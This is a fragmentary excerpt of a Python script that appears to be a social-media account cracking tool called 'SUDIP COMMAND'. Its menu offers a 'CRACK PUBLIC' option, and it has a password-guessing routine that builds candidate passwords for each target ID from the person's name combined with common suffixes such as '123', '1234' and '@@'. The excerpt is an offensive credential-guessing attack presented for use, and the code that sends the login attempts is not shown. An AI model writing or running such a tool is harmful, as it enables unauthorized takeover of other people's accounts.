...
def menu(my_name, my_id):
    ...
    banner()
    info()
    print(' [\x1b[36m•\x1b[1;37m] WELCOME TO SUDIP COMMAND          : ' + uname)
    print(' [\x1b[36m•\x1b[1;37m] IP ADDRESS    : ' + ipadd)
    print(' [\x1b[36m•\x1b[1;37m] TODAYS DATE : ' + date)
    linex()
    print(' [\x1b[36m1\x1b[1;37m] CRACK PUBLIC       ')
    print(' [\x1b[36m2\x1b[1;37m]                   [\x1b[36m6\x1b[1;37m] CONTACT ADMIN')
...
def passwrd():
    ...
    for yuzong in id2:
        ...
        if len(nmf) < 6:
            ...
            pwv.append(lst + frs + '987')
            pwv.append(lst + frs + '132')
        if len(frs) < 3:
            pwv.append(nmf)
        pwv.append(nmf)
        pwv.append(frs + '@@')
        ...
        pwv.append(frs + '123')
        pwv.append(frs + '123_')
        pwv.append(frs + '123___')
        pwv.append(frs + '1234')
        pwv.append(frs + '1234_')
        pwv.append(frs + '12345')
        pwv.append(frs + '123456')
        pwv.append(frs + '_123')
        pwv.append(frs + '__123')
        pwv.append(frs + '_1234')
        pwv.append(frs + '_12345')
        pwv.append(frs + '_123456')
        if 'ya' in pwpluss:
            for xpwd in pwnya:
                pwv.append(xpwd)
                if 'mobile' in method:
